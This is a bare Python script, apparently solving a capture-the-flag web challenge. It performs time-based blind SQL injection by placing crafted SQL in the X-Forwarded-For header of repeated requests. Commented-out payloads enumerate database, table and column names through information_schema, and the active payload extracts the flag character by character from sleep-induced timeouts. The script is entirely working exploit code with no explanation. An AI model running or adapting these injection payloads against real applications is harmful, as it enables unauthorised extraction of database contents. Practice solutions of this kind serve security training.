# #http://www.shiyanbar.com/ctf/1941
import requests

payload = 'qwertyuiopasdfghjklzxcvbnm1234567890!@#$%^&*(){}._-+='
flag = ''
url = 'http://ctf5.shiyanbar.com/web/wonderkun/index.php'
headers = {
    'Host': 'ctf5.shiyanbar.com',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0 Iceweasel/43.0.4',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Cookie': 'PHPSESSID=4815adea54da521142dc7b41469fef3c',
    'Connection': 'close'
}

for i in range(6):
    for pl in payload:
        #数据库名
        # headers['X-Forwarded-For'] = "' +(select case when (substring((select database())from {} for 1)='{}') then sleep(5) else 0 end) and '1'='1".format(i,pl)
        #表名
        # headers['X-Forwarded-For'] = "' +(select case when (substring((select(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database()))) from {} for 1)='{}') then sleep(5) else 0 end) and '1'='1".format(i,pl)
        #字段名
        # headers['X-Forwarded-For'] = "' +(select case when (substring((select(select(group_concat(column_name))from(information_schema.columns)where(table_name=0x666C6167))) from {} for 1)='{}') then sleep(5) else 0 end) and '1'='1".format(i,pl)
        #拿flag
        headers['X-Forwarded-For'] = "' +(select case when (substring((select flag from clien) from {} for 1)='{}') then sleep(5) else 0 end) and '1'='1".format(i,pl)
        try:
            requests.get(url, headers=headers, timeout=4)
        except:
            flag += pl
            print(flag)
            break